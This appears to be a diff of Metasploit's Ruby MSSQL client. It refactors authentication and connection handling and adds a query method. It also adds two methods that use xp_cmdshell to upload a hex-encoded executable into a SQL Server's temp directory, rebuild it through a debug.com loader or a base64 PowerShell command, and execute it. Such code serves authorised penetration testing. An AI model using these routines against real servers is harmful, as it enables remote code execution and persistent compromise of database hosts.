@@ -1,23 +1,74 @@
 require 'metasploit/framework/tcp/client'
 require 'metasploit/framework/mssql/tdssslproxy'
-require 'metasploit/framework/mssql/base'
+require 'rex/proto/mssql/client_mixin'
+require 'rex/text'
+require 'msf/core/exploit'
+require 'msf/core/exploit/remote'
 
-module Metasploit
-  module Framework
+module Rex
+  module Proto
     module MSSQL
-
-      module Client
-        extend ActiveSupport::Concern
+      class Client
         include Metasploit::Framework::Tcp::Client
-        include Metasploit::Framework::MSSQL::Base
+        include Rex::Proto::MSSQL::ClientMixin
+        include Rex::Text
+        include Msf::Exploit::Remote::MSSQL_COMMANDS
+        include Msf::Exploit::Remote::Udp
+        include Msf::Exploit::Remote::NTLM::Client
+        include Msf::Exploit::Remote::Kerberos::Ticket::Storage
+        include Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Options
+
+        attr_accessor :tdsencryption
+        attr_accessor :sock
+        attr_accessor :auth
+        attr_accessor :ssl
+        attr_accessor :ssl_version
+        attr_accessor :ssl_verify_mode
+        attr_accessor :ssl_cipher
+        attr_accessor :proxies
+        attr_accessor :connection_timeout
+        attr_accessor :send_lm
+        attr_accessor :send_ntlm
+        attr_accessor :send_spn
+        attr_accessor :use_lmkey
+        attr_accessor :use_ntlm2_session
+        attr_accessor :use_ntlmv2
+        attr_accessor :windows_authentication
+        attr_reader :framework_module
+        attr_reader :framework
+        # @!attribute max_send_size
+        #   @return [Integer] The max size of the data to encapsulate in a single packet
+        attr_accessor :max_send_size
+        # @!attribute send_delay
+        #   @return [Integer] The delay between sending packets
+        attr_accessor :send_delay
+
+        def initialize(framework_module, framework, rhost, rport = 1433)
+          @framework_module       = framework_module
+          @framework              = framework
+          @connection_timeout     = framework_module.datastore['ConnectTimeout']      || 30
+          @max_send_size          = framework_module.datastore['TCP::max_send_size']  || 0
+          @send_delay             = framework_module.datastore['TCP::send_delay']     || 0
+
+          @auth                   = framework_module.datastore['Mssql::Auth']         || Msf::Exploit::Remote::AuthOption::AUTO
+          @hostname               = framework_module.datastore['Mssql::Rhostname']    || ''
+
+          @windows_authentication = framework_module.datastore['USE_WINDOWS_AUTHENT'] || false
+          @tdsencryption          = framework_module.datastore['TDSENCRYPTION']       || false
+          @hex2binary             = framework_module.datastore['HEX2BINARY']          || ''
+
+          @domain_controller_rhost = framework_module.datastore['DomainControllerRhost'] || ''
+          @rhost = rhost
+          @rport = rport
+        end
 
         #
         # This method connects to the server over TCP and attempts
         # to authenticate with the supplied username and password
         # The global socket is used and left connected after auth
         #
-        def mssql_login(user='sa', pass='', db='', domain_name='')
 
+        def mssql_login(user='sa', pass='', db='', domain_name='')
           disconnect if self.sock
           connect
           mssql_prelogin
@@ -54,11 +105,10 @@ module Metasploit
             cname = Rex::Text.to_unicode( Rex::Text.rand_text_alpha(rand(8)+1) )
             aname = Rex::Text.to_unicode( Rex::Text.rand_text_alpha(rand(8)+1) ) #application and library name
             sname = Rex::Text.to_unicode( rhost )
-
-            framework_module.fail_with(Msf::Exploit::Failure::BadConfig, 'The Mssql::Rhostname option is required when using kerberos authentication.') if hostname.blank?
+            framework_module.fail_with(Msf::Exploit::Failure::BadConfig, 'The Mssql::Rhostname option is required when using kerberos authentication.') if @hostname.blank?
             kerberos_authenticator = Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::MSSQL.new(
-              host: domain_controller_rhost,
-              hostname: hostname,
+              host: @domain_controller_rhost,
+              hostname: @hostname,
               mssql_port: rport,
               proxies: proxies,
               realm: domain_name,
@@ -357,8 +407,6 @@ module Metasploit
           info = {:errors => []}
           info = mssql_parse_reply(resp, info)
 
-          disconnect
-
           return false if not info
           info[:login_ack] ? true : false
         end
@@ -367,7 +415,6 @@ module Metasploit
         #this method send a prelogin packet and check if encryption is off
         #
         def mssql_prelogin(enc_error=false)
-
           pkt = ""
           pkt_hdr = ""
           pkt_data_token = ""
@@ -504,44 +551,112 @@ module Metasploit
           tdsproxy.send_recv(req)
         end
 
+        def mssql_query(sqla, doprint=false, opts={})
+          info = { :sql => sqla }
+          opts[:timeout] ||= 15
+          pkts = []
+          idx  = 0
+
+          bsize = 4096 - 8
+          chan  = 0
+
+          @cnt ||= 0
+          @cnt += 1
+
+          sql = Rex::Text.to_unicode(sqla)
+          while(idx < sql.length)
+            buf = sql[idx, bsize]
+            flg = buf.length < bsize ? "\x01" : "\x00"
+            pkts << "\x01" + flg + [buf.length + 8].pack('n') + [chan].pack('n') + [@cnt].pack('C') + "\x00" + buf
+            idx += bsize
+
+          end
+
+          resp = mssql_send_recv(pkts.join, opts[:timeout])
+          mssql_parse_reply(resp, info)
+          mssql_print_reply(info) if doprint
+          info
+        end
+
+        def mssql_upload_exec(exe, debug=false)
+          hex = exe.unpack("H*")[0]
+
+          var_bypass  = Rex::Text.rand_text_alpha(8)
+          var_payload = Rex::Text.rand_text_alpha(8)
+
+          print_status("Warning: This module will leave #{var_payload}.exe in the SQL Server %TEMP% directory")
+          print_status("Writing the debug.com loader to the disk...")
+          h2b = File.read(@hex2binary, File.size(@hex2binary))
+          h2b.gsub!(/KemneE3N/, "%TEMP%\\#{var_bypass}")
+          h2b.split(/\n/).each do |line|
+            mssql_xpcmdshell("#{line}", false)
+          end
+
+          print_status("Converting the debug script to an executable...")
+          mssql_xpcmdshell("cmd.exe /c cd %TEMP% && cd %TEMP% && debug < %TEMP%\\#{var_bypass}", debug)
+          mssql_xpcmdshell("cmd.exe /c move %TEMP%\\#{var_bypass}.bin %TEMP%\\#{var_bypass}.exe", debug)
+
+          print_status("Uploading the payload, please be patient...")
+          idx = 0
+          cnt = 500
+          while(idx < hex.length - 1)
+            mssql_xpcmdshell("cmd.exe /c echo #{hex[idx, cnt]}>>%TEMP%\\#{var_payload}", false)
+            idx += cnt
+          end
+
+          print_status("Converting the encoded payload...")
+          mssql_xpcmdshell("%TEMP%\\#{var_bypass}.exe %TEMP%\\#{var_payload}", debug)
+          mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_bypass}.exe", debug)
+          mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_payload}", debug)
+
+          print_status("Executing the payload...")
+          mssql_xpcmdshell("%TEMP%\\#{var_payload}.exe", false, {:timeout => 1})
+        end
+
+        def powershell_upload_exec(exe, debug=false)
+          # hex converter
+          hex = exe.unpack("H*")[0]
+          # create random alpha 8 character names
+          #var_bypass  = rand_text_alpha(8)
+          var_payload = rand_text_alpha(8)
+          print_status("Warning: This module will leave #{var_payload}.exe in the SQL Server %TEMP% directory")
+          # our payload converter, grabs a hex file and converts it to binary for us through powershell
+          h2b = "$s = gc 'C:\\Windows\\Temp\\#{var_payload}';$s = [string]::Join('', $s);$s = $s.Replace('`r',''); $s = $s.Replace('`n','');$b = new-object byte[] $($s.Length/2);0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes('C:\\Windows\\Temp\\#{var_payload}.exe',$b)"
+          h2b_unicode=Rex::Text.to_unicode(h2b)
+          # base64 encode it, this allows us to perform execution through powershell without registry changes
+          h2b_encoded = Rex::Text.encode_base64(h2b_unicode)
+          print_status("Uploading the payload #{var_payload}, please be patient...")
+          idx = 0
+          cnt = 500
+          while(idx < hex.length - 1)
+            mssql_xpcmdshell("cmd.exe /c echo #{hex[idx, cnt]}>>%TEMP%\\#{var_payload}", false)
+            idx += cnt
+          end
+          print_status("Converting the payload utilizing PowerShell EncodedCommand...")
+          mssql_xpcmdshell("powershell -EncodedCommand #{h2b_encoded}", debug)
+          mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_payload}", debug)
+          print_status("Executing the payload...")
+          mssql_xpcmdshell("%TEMP%\\#{var_payload}.exe", false, {:timeout => 1})
+          print_status("Be sure to cleanup #{var_payload}.exe...")
+        end
+
         protected
 
-        def auth
-          raise NotImplementedError
+        def rhost
+          @rhost
         end
 
-        def domain_controller_rhost
-          raise NotImplementedError
+        def rport
+          @rport
         end
 
-        def hostname
-          raise NotImplementedError
+        def chost
+          return nil
         end
 
-        def windows_authentication
-          raise NotImplementedError
+        def cport
+          return nil
         end
-
-        def use_ntlm2_session
-          raise NotImplementedError
-        end
-
-        def use_ntlmv2
-          raise NotImplementedError
-        end
-
-        def send_lm
-          raise NotImplementedError
-        end
-
-        def send_ntlm
-          raise NotImplementedError
-        end
-
-        def send_spn
-          raise NotImplementedError
-        end
-
       end
 
     end
